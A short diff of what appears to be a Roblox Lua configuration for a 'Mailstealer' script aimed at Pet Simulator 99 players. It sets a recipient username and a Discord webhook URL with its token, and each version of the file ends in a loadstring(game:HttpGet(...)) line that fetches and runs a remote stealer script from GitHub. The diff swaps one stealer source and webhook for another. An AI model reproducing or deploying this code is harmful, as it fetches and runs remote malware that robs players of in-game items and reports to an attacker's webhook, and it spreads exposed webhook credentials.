@@ -1,5 +1,5 @@
 Username = "BET3KN_2"
-Username2 = "BET3KN_2"
-Webhook = "https://discord.com/api/webhooks/1244162360126734429/t3jOd8ZsYyB3ej5oodujdx6_Gcqct3PV7xc4AfYDr3I-uddlN5gCDxM-L3ze1fM_FPso"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1244163425123307530/DiUmTT6caVxVlPCum-WQab9qj3mV7C-NoSDPFGdn8kL7-CSu8RMBVbPDtI8tFBhq1JDw" -- Paste your Discord webhook here
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherScript/PS99-Mailstealer/main/PS99Mailstealer"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
